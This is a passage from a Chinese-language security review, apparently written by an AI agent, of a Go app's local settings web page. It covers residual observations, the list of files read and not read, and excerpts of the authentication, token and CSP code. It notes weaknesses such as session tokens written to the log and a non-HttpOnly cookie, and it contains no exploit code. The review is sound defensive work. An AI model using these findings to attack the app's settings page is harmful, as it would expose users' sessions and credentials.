   - 遗留观察（非缺陷）：`Config()` 返回**共享指针**（`appstate.go:90-94`），调用方若就地改写字段就会绕过锁。审核了 `internal/app` 内的所有调用点，都是只读或先 `Clone()/PageBase()`（`settings.go:469`、`541`、`680`、`693`、`736`、`746`；`appstate.go:143`、`201`、`219`），未发现就地写。建议在注释里明确「返回的指针只读」。
   - 并发保存是「后写覆盖」（两个 POST 都从同一份 `PageBase()` 克隆），需要令牌，影响有限，未列为独立发现。
3. **`withWriteDeadline` 每请求重算**（`settings.go:329-340`）让写超时随配置从 30 秒一路到 `900s × 6 = 5400s`（`writeTimeout`，`:52-58`；上限见 `config.go:120-124`）。这是有意设计；配合 `ReadTimeout=30s`/`ReadHeaderTimeout=5s`（`:147-150`）后慢速攻击面被限制，未发现可用性缺陷。`http.MaxBytesReader` 在两处写端点齐备（`:542` 64 KiB、`:615` 16 KiB）。
4. **`logTail` 每次切换 About 标签都 `os.ReadFile` 整个日志**（`settings.go:745-759`，`app.js:1156`）。日志按 4 MiB 轮转（`logging/log.go:16`），因此单次上限约 4 MiB，且需要有效会话，未列为发现；若将来轮转上限调大，这里会变成内存放大点。「按尾部读取」（`Seek` 到末尾若干字节）是更稳的写法。
5. **静态资源与边界**：`assets()` 的 `http.FileServer` 对 `/static/` 会命中目录下的 `index.html`（`webui/assets/` 里确实有它），因此不会出现目录列表；`/static/../…` 之类由 `http.ServeMux`（Go 1.22+ 语义）与 `fs.FS` 双重收敛，且该分支仍先过 `authorised`（`settings.go:352-355`）。
6. **i18n 注入：无。** 全部译文是编译期 Go 字面量（`i18n_web.go:5-235`），`ALL(lang)` 返回 map（`i18n.go:139-150`）；语言只能来自 `?lang=`（服务端只接受 `zh`/`en`，`settings.go:470-473`）或配置里的 `language`；环境变量只在 `auto` 时用于选 zh/en（`i18n/locale_other.go:11-20`、`locale_windows.go:14-21`），**不能影响文案内容**。页面侧一律 `textContent`（见上表）。

---
## 覆盖声明

**读完（逐行）**
- `internal/app/settings.go`（783 行，含 `routes`/`authorised`/`handleIndex`/`handleConfig`/`handleAction`/`tailLog`/`serveAsset`/`writeJSON*` 全部）
- `internal/app/appstate.go`（257 行）
- `internal/app/payload.go`（224 行）
- `internal/webui/webui.go`（23 行）
- `internal/webui/assets/app.js`（**1532 行全部读完**，分两批）
- `internal/webui/assets/index.html`（309 行全部读完）
- `internal/i18n/i18n_web.go`（235 行）
- 测试：`internal/webui/assets_test.go`（125 行全部）、`internal/i18n/i18n_web_test.go`（31 行全部）、`internal/app/appstate_test.go`（206 行全部）、`internal/app/settings_test.go`（1122 行：逐用例读过函数名/断言/注释，并精读了 `:20-139`、`:255-324`、`:366-395`、`:490-604`；中间段以 grep 定位逐用例核对，未逐行读完）

**粗读 / 只做定点检索（为判断本模块的边界与可控性）**
- `internal/webui/assets/app.css`（675 行）：只检索 `url(` / `@import` / `expression`，**零命中**，即没有任何外部资源引用或 CSS 表达式注入面
- `internal/config/config.go`（774 行）：`Config`/`Account` 结构体与 json 标签、`Validate`、`ValidHTTPURL`、`PageBase`、`marshal`、`Save`、`KeepPasswordsFrom`、`markStoredPasswords`、`loadPasswords`、`Clone`
- `internal/config/passwordfile.go`（常量 `SourceConfig`/`SourceFile`/`SourceRun`）
- `internal/platform/openurl_windows.go`、`openurl_other.go`、`appwindow.go`
- `internal/logging/log.go`（`Debug` 的 verbose 门控、`logFileMode`/`logDirMode`、`maxLogSize`、轮转）
- `internal/i18n/i18n.go`、`locale_other.go`、`locale_windows.go`
- `cmd/SDAutoLogin/cli.go`（`--settings`/`--app` 的解析与用法）、`cmd/SDAutoLogin/main.go`（`Log.Init`、`SettingsAddr`）

**未读 / 未做**
- 未读：`internal/portal/`、`internal/service/`、`internal/update/`、`internal/tray/`、`internal/config/protect_*.go` 的完整实现（只在判断跨模块影响时定点检索：`PortalBaseURL`/`EportalURL` 的使用点、`NewServer` 的调用点）。其中「门户应答内容如何进入状态与日志」属于 A/C 号审查员的范围。
- **无 Go 工具链**（`go` 在 Windows 与 WSL 均不存在），故**未运行 `go build`、`go vet`、`go test`、`staticcheck`、`govulncheck`**；所有「测试覆盖了/没覆盖」的结论来自读测试源码，不是运行结果。
- **无浏览器、无法起服务**，故以下三项**无法验证**：(a) 浏览器对 `app.js`/`app.css` 的实际缓存行为（[S3-2]）；(b) DNS rebinding 下浏览器是否确实不带 host-only cookie（[S3-1] 的结论 3/4）；(c) [S2-2] 的端到端外送（需要能起一个本地「门户」并跑 `go test`）。
- 未做的动态测试（本轮为纯静态对抗性审查，任务禁止修改源码）：慢速请求、大请求体、并发保存、端口扫描、`curl` 变体方法（`OPTIONS`/`HEAD`/`TRACE`）。
- 本次审查**没有修改任何源码文件**，只新增本报告。

---

## 附录：关键代码摘录

**A. 鉴权与写操作双重校验（`internal/app/settings.go:374-404`）**
```go
func (s *Server) authorised(r *http.Request) bool {
	s.lastHit.Store(time.Now().UnixNano())
	cookie, err := r.Cookie(sessionCookie)
	if err != nil { ...; return false }
	s.mu.Lock()
	session := s.session
	s.mu.Unlock()
	if !tokenEqual(cookie.Value, session) { ...; return false }
	if r.Method == http.MethodGet { return true }
	if !tokenEqual(r.Header.Get("X-Auth-Token"), session) { ...; return false }
	return true
}
```

**B. 常量时间比较（`settings.go:406-414`）**
```go
func tokenEqual(got, want string) bool {
	if want == "" { return false }
	return subtle.ConstantTimeCompare([]byte(got), []byte(want)) == 1
}
```

**C. 令牌生成（`settings.go:298-304`）**
```go
func randomToken() (string, error) {
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err != nil { return "", err }
	return hex.EncodeToString(buf), nil
}
```

**D. 安全头与 CSP（`settings.go:60-64`、`363-372`）**
```go
const contentSecurityPolicy = "default-src 'none'; script-src 'self'; style-src 'self'; " +
	"img-src 'self'; connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'"
...
h.Set("Content-Security-Policy", contentSecurityPolicy)
h.Set("X-Content-Type-Options", "nosniff")
h.Set("X-Frame-Options", "DENY")
h.Set("Referrer-Policy", "no-referrer")
```

**E. 令牌换 cookie（`settings.go:442-462`）**
```go
func (s *Server) startSession(w http.ResponseWriter) {
	s.mu.Lock(); session := s.session; s.mu.Unlock()
	if _, err := s.rollEntry(); err != nil { logging.Log.Warn("making the next settings address: %v", err) }
	http.SetCookie(w, &http.Cookie{
		Name: sessionCookie, Value: session, Path: "/",
		SameSite: http.SameSiteStrictMode,
		// Not Secure, and not HttpOnly: ...
	})
	w.Header().Set("Location", "/")
	w.WriteHeader(http.StatusSeeOther)
}
```

**F. 令牌写进日志（`settings.go:181-198`）**
```go
// rollEntry makes a new token for the address handed to a browser, so the one
// before it stops working: an address that was seen, logged or left in a
// history opens the page once and no more. The new address goes to the log.
func (s *Server) rollEntry() (string, error) {
	...
	s.url = urlFor(s.bound, entry)
	url := s.url
	s.mu.Unlock()

	logging.Log.Info("settings page at %s", url)
	return url, nil
}
```

**G. 请求体上限，无 Content-Type 校验（`settings.go:542`、`615`）**
```go
if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 64<<10)).Decode(next); err != nil {
...
if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 16<<10)).Decode(&req); err != nil {
```

**H. 前端唯一读令牌处（`internal/webui/assets/app.js:7-15`）**
```js
const TOKEN_COOKIE = "sdauth";
function readToken() {
  const prefix = TOKEN_COOKIE + "=";
  const found = document.cookie.split("; ").find((part) => part.startsWith(prefix));
  return found ? found.slice(prefix.length) : "";
}
const token = readToken();
```

**I. 前端唯一请求封装（`app.js:43-59`）**
```js
async function api(path, options) {
  const opts = options || {};
  opts.headers = Object.assign({ "X-Auth-Token": token }, opts.headers || {});
  if (opts.body) { opts.headers["Content-Type"] = "application/json"; }
  ...
  resp = await fetch(path, opts);
```
